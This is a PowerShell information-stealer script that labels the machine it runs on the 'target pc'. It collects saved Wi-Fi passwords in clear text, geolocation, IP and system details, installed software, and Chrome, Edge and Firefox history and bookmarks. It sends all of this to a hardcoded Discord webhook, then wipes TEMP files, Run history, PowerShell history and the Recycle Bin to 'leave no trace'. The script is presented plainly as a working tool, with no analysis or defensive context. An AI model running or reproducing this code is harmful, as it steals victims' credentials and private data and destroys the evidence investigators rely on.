# Set TLS 1.2 as the security protocol
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
#Hide Errors
$ErrorActionPreference = 'SilentlyContinue'
# Define Discord webhook URL
$hookUrl = 'https://discord.com/api/webhooks/1200196454774480987/_0U4G5cT7Ri6k8usrkaF32udNqP_qT54UQSDk6EiyiDxQFFaZM7_hcBNqgVJNZi5PBU9'
#Define sending-to-discord function
function Upload-Discord {
    [CmdletBinding()]
    param (
        [parameter(Position=0, Mandatory=$False)]
        [string]$text 
    )

    $username = $env:username
    $textChunks = [System.Collections.ArrayList]@()

    # Split text into chunks of 2000 characters
    while ($text.Length -gt 0) {
        $chunk = $text.Substring(0, [Math]::Min(2000, $text.Length))
        $textChunks.Add($chunk)
        $text = $text.Substring($chunk.Length)
    }

    # Send each chunk as a separate message with a delay
    foreach ($chunk in $textChunks) {
        $Body = @{
            'username' = $username
            'content' = $chunk
        }

        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookUrl -Method Post -Body ($Body | ConvertTo-Json)
        
        # Introduce a delay (adjust as needed)
        Start-Sleep -Seconds 1
    }
}

# Get info about target pc
function Get-GeoLocation{
	try {
	Add-Type -AssemblyName System.Device #Required to access System.Device.Location namespace
	$GeoWatcher = New-Object System.Device.Location.GeoCoordinateWatcher #Create the required object
	$GeoWatcher.Start() #Begin resolving current locaton

	while (($GeoWatcher.Status -ne 'Ready') -and ($GeoWatcher.Permission -ne 'Denied')) {
		Start-Sleep -Milliseconds 100 #Wait for discovery.
	}  

	if ($GeoWatcher.Permission -eq 'Denied'){
		Write-Error 'Access Denied for Location Information'
	} else {
		$GL = $GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevent results.
		$GL = $GL -split " "
		$Lat = $GL[0].Substring(11) -replace ".$"
		$Lon = $GL[1].Substring(10) -replace ".$" 
		return $Lat, $Lon


	}
	}
    # Write Error is just for troubleshooting
    catch {Write-Error "No coordinates found" 
    return "No Coordinates found"
    -ErrorAction SilentlyContinue
    } 

}

#get browserData
function Get-BrowserData {

    [CmdletBinding()]
    param (	
        [Parameter(Position=1, Mandatory=$True)]
        [string]$DataType 
    ) 

    $Regex = '(http|https)://([\w-]+\.)+[\w-]+(/[\w- ./?%&=]*)*?'

    # List of supported browsers
    $SupportedBrowsers = @(
        'chrome',
        'edge',
        'firefox'
        # Add other supported browsers as needed
    )

    $ResultArray = @()

    foreach ($Browser in $SupportedBrowsers) {
        $Path = Get-BrowserPath -Browser $Browser -DataType $DataType

        if ($Path -ne $null) {
            $Value = Get-Content -Path $Path | Select-String -AllMatches $regex | % {($_.Matches).Value} | Sort-Object -Unique

            $Value | ForEach-Object {
                $ResultArray += New-Object -TypeName PSObject -Property @{
                    User = $env:UserName
                    Browser = $Browser
                    DataType = $DataType
                    Data = $_
                }
            }
        }
    }

    return $ResultArray
}

function Get-BrowserPath {
    param (
        [Parameter(Position=1, Mandatory=$True)]
        [string]$Browser,
        [Parameter(Position=2, Mandatory=$True)]
        [string]$DataType
    )

    switch ($Browser) {
        'chrome' {
            if ($DataType -eq 'history') {
                return "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\History"
            }
            elseif ($DataType -eq 'bookmarks') {
                return "$Env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
            }
        }
        'edge' {
            if ($DataType -eq 'history') {
                return "$Env:USERPROFILE\AppData\Local\Microsoft/Edge/User Data/Default/History"
            }
            elseif ($DataType -eq 'bookmarks') {
                return "$env:USERPROFILE\AppData\Local\Mozilla\Edge\User Data\Default\Bookmarks"
            }
        }
        'firefox' {
            if ($DataType -eq 'history') {
                return "$Env:USERPROFILE\AppData\Roaming\Mozilla\Firefox\Profiles\*.default-release\places.sqlite"
            }
        }
        # Add additional cases for other browsers as needed
    }

    Write-Warning "Unsupported browser or data type."
    return $null
}
#organize collected data#
$allBrowserHistory = Get-BrowserData -DataType 'history' | Out-String
$allBrowserBookmarks = Get-BrowserData -DataType 'bookmarks' | Out-String


$allBrowserData = "HISTORY:`n`n`n`n`n" + $allBrowserHistory + "BOOKMARKS:`n`n`n`n`n" + $allBrowserBookmarks
$Lat, $Lon = Get-GeoLocation
$Location = "Latitude: $Lat, Longitude: $Lon"
$ip = Invoke-Expression 'ipconfig' | Out-String
$ipv4Address = (ipconfig | Select-String "IPv4 Address").ToString() -replace '.*?(\d+\.\d+\.\d+\.\d+).*', '$1'
$wifi = (netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_ -replace "^\s+All User Profile\s+:\s+", "" } | ForEach-Object { netsh wlan show profiles $_ key=clear | Select-String "SSID name", "Key Content" }) -join "`n"
$os = (Get-CimInstance Win32_OperatingSystem).Caption
$software = (Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion)
$computerSystem = Invoke-Expression 'Get-WmiObject Win32_ComputerSystem' | Out-String
#collected data:#
$data = "Username: " + $env:USERNAME + "`nComputer name: " + $env:COMPUTERNAME + "`nDisc location: " + $env:USERPROFILE + "`nComputer system: " + $computerSystem + "`nOS: " + $os + "`n`n`nLocation: " + $Location + "`n`nIPv4: " + $ipv4Address + "`nMore IP info: " + $ip + "`nWifi password(s):`n" + $wifi + "`n`n`n`n`nBROWSERDATA:`n$allBrowserData"

# Example usage
Upload-Discord -text "$data"





#leave no trace
# Remove files in the TEMP directory
Remove-Item $env:TEMP\* -Recurse -Force
# Clear recent Run history in Windows Registry
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
# Remove PowerShell history file
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
# Clear the Recycle Bin
Clear-RecycleBin -Force
